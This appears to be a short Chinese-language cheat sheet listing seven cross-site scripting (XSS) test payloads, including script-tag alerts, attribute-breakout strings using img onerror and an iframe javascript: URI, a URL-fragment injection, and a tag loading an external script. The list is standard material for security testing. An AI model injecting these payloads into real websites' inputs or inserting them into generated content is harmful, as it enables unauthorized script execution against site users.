## XSS 测试 payload

- `<script>alert('xss')</script>`

- `http://localhost/x.html#<script>alert('xss')</script>`

- `<script src=http://www.qq.com></script>`

- `"><script>alert(1)</script>`

- `"><img src=x onerror=alert("xss")>`

- `"><iframe src=javascript:alert(1)></iframe>`

- `</script>`
